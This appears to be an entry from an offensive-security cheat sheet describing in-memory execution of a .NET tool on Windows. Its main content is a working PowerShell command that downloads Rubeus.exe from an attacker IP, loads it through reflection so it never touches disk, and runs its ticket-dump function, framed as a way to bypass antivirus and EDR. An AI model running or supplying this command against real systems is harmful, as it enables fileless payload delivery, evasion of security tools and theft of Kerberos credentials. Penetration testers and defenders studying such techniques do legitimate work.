---
description: |
  This technique allows an attacker to download and execute a .NET assembly (EXE) from a remote source in memory, without writing it to disk. This is useful for bypassing antivirus (AV) and endpoint detection and response (EDR) solutions since the file never touches the disk. The following PowerShell command retrieves an executable (e.g., Rubeus.exe) from a remote server, loads it directly into memory using .NET reflection, and executes a function inside it. 

  Command Reference:
  ```
  Attacking IP: 10.10.10.1

  Executable to be loaded: Rubeus.exe

  Arguments of executable: dump /nowrap
  ```
command: |
  $data = (New-Object System.Net.WebClient).DownloadData('http://10.10.10.1/Rubeus.exe')
  $assem = [System.Reflection.Assembly]::Load($data)

  [Rubeus.Program]::Main("dump /nowrap".Split()) 

items:
  - Shell
services:
  - Antivirus
OS:
  - Windows
attack_types:
  - Bypassing
  - Injection
references:
  - https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md#quick-start
---